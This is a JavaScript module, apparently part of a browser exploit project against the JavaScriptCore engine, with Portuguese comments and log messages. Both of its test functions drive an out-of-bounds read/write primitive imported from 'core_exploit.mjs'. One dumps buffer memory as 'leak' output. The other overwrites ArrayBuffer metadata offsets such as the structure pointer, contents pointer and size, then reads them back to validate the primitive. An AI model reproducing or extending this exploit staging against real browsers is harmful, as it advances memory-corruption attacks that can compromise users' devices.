// js/script3/testOOBReadValidation.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Função do teste anterior (mantida para referência, mas não será chamada diretamente por este runAllAdvancedTestsS3)
export async function executeValidateReadPrimitiveAndDumpStartTest() {
    const FNAME_TEST = "executeValidateReadPrimitiveAndDumpStartTest";
    logS3(`--- Iniciando Teste: Validação de Leitura OOB e Dump Inicial do Buffer ---`, "test", FNAME_TEST);
    document.title = `OOBReadVal & Dump Initial`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }
    logS3(`oob_array_buffer_real configurado. Tamanho total via JS: ${oob_array_buffer_real.byteLength} bytes.`, "info", FNAME_TEST);
    
    logS3("1. Forçando inicialização completa do oob_array_buffer_real...", "info", FNAME_TEST);
    try {
        if (oob_array_buffer_real.byteLength > 0) {
            const temp_dv = new DataView(oob_array_buffer_real);
            temp_dv.setUint8(0, 0x01); 
            logS3("   Escrita de um byte no oob_array_buffer_real (via DataView) para forçar inicialização, realizada.", "good", FNAME_TEST);
        } else {
            logS3("   oob_array_buffer_real tem tamanho 0, pulando escrita de inicialização.", "warn", FNAME_TEST);
        }
    } catch (e_init) {
        logS3(`   ERRO ao tentar forçar inicialização do oob_array_buffer_real: ${e_init.message}`, "error", FNAME_TEST);
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    const bytesToDump = Math.min(64, oob_array_buffer_real.byteLength);
    logS3(`--- 2. Dump dos Primeiros ${bytesToDump} Bytes do oob_array_buffer_real (lendo como QWORDs de 8 bytes) ---`, "subtest", FNAME_TEST);
    
    let expected_offsets_info = `Offsets esperados (de config.mjs):\n`;
    try {
        expected_offsets_info += `  - JSCell.STRUCTURE_POINTER_OFFSET: ${toHex(parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16))}\n`;
        expected_offsets_info += `  - ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET: ${toHex(parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16))}\n`;
        expected_offsets_info += `  - ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: ${toHex(parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16))}`;
        logS3(expected_offsets_info, "info", FNAME_TEST);
    } catch (e) { logS3("Erro ao parsear offsets do config.mjs para logging.", "warn", FNAME_TEST); }

    for (let current_offset = 0; current_offset < bytesToDump; current_offset += 8) {
        // ... (lógica de dump como antes) ...
        if (current_offset + 8 > oob_array_buffer_real.byteLength) { break; }
        try {
            const val = oob_read_absolute(current_offset, 8);
            // ... (log como antes) ...
            logS3(`   Offset ${toHex(current_offset)} - ${toHex(current_offset + 7)}: ${val.toString(true)} (L: ${toHex(val.low())} H: ${toHex(val.high())})`, "leak", FNAME_TEST);
        } catch (e) {
            logS3(`   Erro ao ler 8 bytes do offset ${toHex(current_offset)}: ${e.message}`, "error", FNAME_TEST);
        }
        if (current_offset < bytesToDump - 8) { await PAUSE_S3(5); }
    }
    logS3(`--- Teste Dump da Estrutura Inicial CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
}


// NOVA FUNÇÃO DE TESTE
export async function executeComprehensiveRWValidationTest() {
    const FNAME_TEST = "executeComprehensiveRWValidationTest";
    logS3(`--- Iniciando Teste: Validação Abrangente de R/W em Offsets de Metadados ---`, "test", FNAME_TEST);
    document.title = `Comprehensive R/W Validation`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }
    logS3(`oob_array_buffer_real configurado. Tamanho: ${oob_array_buffer_real.byteLength} bytes.`, "info", FNAME_TEST);
    
    // Tenta forçar inicialização, embora o oob_array_buffer_real já deva estar "vivo"
    try {
        if (oob_array_buffer_real.byteLength > 0) {
            const temp_dv = new DataView(oob_array_buffer_real);
            temp_dv.setUint8(0, 0xFE); // Escreve um valor diferente para não confundir com o primeiro teste
            logS3("   Escrita de um byte no oob_array_buffer_real (via DataView) para garantir inicialização.", "info", FNAME_TEST);
        }
    } catch (e_init) {
        logS3(`   ERRO ao tentar escrita de inicialização: ${e_init.message}`, "warn", FNAME_TEST);
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    const offsets_to_test = [
        0x00, // Potencial JSCell Header / Structure* (se offset 0)
        0x08, // Potencial Structure* (JSCell.STRUCTURE_POINTER_OFFSET) / Butterfly*
        0x10, // Potencial ContentsImpl* (ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET) / Butterfly* (se JSCell grande)
        0x18, // Potencial Tamanho JSArrayBuffer (ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)
        0x20, // Adjacente
        0x28  // Adjacente / Sharing Mode
    ];

    let all_tests_passed = true;

    for (let i = 0; i < offsets_to_test.length; i++) {
        const current_offset = offsets_to_test[i];
        // Cria um padrão de 8 bytes único para cada offset, ex: 0x11111111_offset, 0x22222222_offset etc.
        // Para simplificar, usaremos um padrão baseado no índice.
        const low_part = (0x11111111 * (i + 1)) >>> 0;
        const high_part = (0x10101010 * (i + 1)) >>> 0;
        const write_pattern = new AdvancedInt64(low_part, high_part);

        logS3(`\n--- Testando R/W no Offset ${toHex(current_offset)} ---`, "subtest", FNAME_TEST);
        logS3(`   Padrão a ser escrito: ${write_pattern.toString(true)} (L: ${toHex(low_part)}, H: ${toHex(high_part)})`, "info", FNAME_TEST);

        try {
            if (current_offset + 8 > oob_array_buffer_real.byteLength) {
                logS3(`   AVISO: Offset ${toHex(current_offset)} + 8 bytes excede o tamanho do buffer (${oob_array_buffer_real.byteLength}). Pulando escrita/leitura para este offset.`, "warn", FNAME_TEST);
                all_tests_passed = false; // Considerar isso uma falha de configuração do teste se o buffer for muito pequeno
                continue;
            }

            oob_write_absolute(current_offset, write_pattern, 8);
            logS3(`   Escrita de 8 bytes em ${toHex(current_offset)} realizada.`, "info", FNAME_TEST);
            await PAUSE_S3(10); // Pequena pausa entre escrita e leitura

            const read_val = oob_read_absolute(current_offset, 8);
            if (isAdvancedInt64Object(read_val)) {
                logS3(`   Valor lido de ${toHex(current_offset)}: ${read_val.toString(true)} (L: ${toHex(read_val.low())}, H: ${toHex(read_val.high())})`, "leak", FNAME_TEST);
                if (read_val.equals(write_pattern)) {
                    logS3(`   SUCESSO: Valor lido de ${toHex(current_offset)} corresponde ao valor escrito!`, "good", FNAME_TEST);
                } else {
                    logS3(`   FALHA: Valor lido de ${toHex(current_offset)} (${read_val.toString(true)}) DIFERENTE do escrito (${write_pattern.toString(true)})!`, "error", FNAME_TEST);
                    all_tests_passed = false;
                }
            } else {
                logS3(`   FALHA: Leitura de ${toHex(current_offset)} não retornou AdvancedInt64. Retornou: ${typeof read_val}`, "error", FNAME_TEST);
                all_tests_passed = false;
            }
        } catch (e) {
            logS3(`   ERRO durante R/W no offset ${toHex(current_offset)}: ${e.message}`, "error", FNAME_TEST);
            console.error(`Erro R/W offset ${toHex(current_offset)}:`, e);
            all_tests_passed = false;
        }
        await PAUSE_S3(SHORT_PAUSE_S3);
    }

    if (all_tests_passed) {
        logS3("--- Validação Abrangente de R/W CONCLUÍDA: Todos os testes de R/W de 8 bytes nos offsets selecionados passaram! ---", "good", FNAME_TEST);
        document.title = `Comprehensive R/W VALIDATED`;
    } else {
        logS3("--- Validação Abrangente de R/W CONCLUÍDA: UMA OU MAIS FALHAS ocorreram. Verifique os logs. ---", "error", FNAME_TEST);
        document.title = `Comprehensive R/W FAILED`;
    }
    clearOOBEnvironment();
}
